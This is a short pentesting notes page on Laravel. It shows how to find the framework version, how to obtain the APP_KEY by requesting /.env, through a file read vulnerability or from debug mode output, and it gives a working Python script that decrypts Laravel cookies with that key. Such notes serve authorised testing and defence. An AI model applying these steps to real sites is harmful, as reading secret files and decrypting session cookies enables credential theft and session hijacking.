---
description: Laravel Vulnerabilities
---

# Laravel

### Identifying laravel version

Laravel version can be obtained through the errors obtained from the debug mode or accessing the following path (locally or through a file read vulnerability):

```bash
\vendor\laravel\framework\src\Illuminate\Foundation\Application.php
```

<figure><img src="../../.gitbook/assets/laravel_version.png" alt=""><figcaption><p>Identifying laravel version through a file read vulnerability.</p></figcaption></figure>

### Decrypt and re-encrypt cookies

We can decrypt and re-encrypt cookies if we have previously obtained the **APP\_KEY** of the site. The **APP\_KEY** can be obtained through:

* Accessing the "site.com**/.env**" directly or through a file read vulnerability**:**

<figure><img src="../../.gitbook/assets/laravel_appkey.png" alt=""><figcaption><p>Laravel APP_KEY obtained through accessing the /.env file.</p></figcaption></figure>

* If the application is in **"debug"** mode:

<figure><img src="../../.gitbook/assets/laravel_appkey (1).png" alt=""><figcaption><p>Laravel APP_KEY obtained through the information displayed from the debug mode.</p></figcaption></figure>

#### Decrypt Laravel Cookies:

{% code overflow="wrap" %}
```python
#!/usr/bin/python3
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad, pad
import base64
import json

class decrypter:
    def __init__(self, key):
        self.key=key

    def decrypt(self, text):
        decoded_text = json.loads(base64.b64decode(text).decode('utf-8'))
        iv = base64.b64decode(decoded_text['iv'])
        crypt_object = AES.new(key=self.key, mode=AES.MODE_CBC, IV=iv)
        decoded = base64.b64decode(decoded_text['value'])
        decrypted = crypt_object.decrypt(decoded)
        return unpad(decrypted, AES.block_size).decode('utf-8')

key = b"kSeX......" # Replace this with your actual APP_KEY
key = base64.b64decode(key)

# Decryption example
dec = decrypter(key)
encrypted_msg = "eyJpdi...." # Replace this with your encrypted cookie
decrypted_msg = dec.decrypt(encrypted_msg)
print(f'Decrypted message: {decrypted_msg}')
```
{% endcode %}
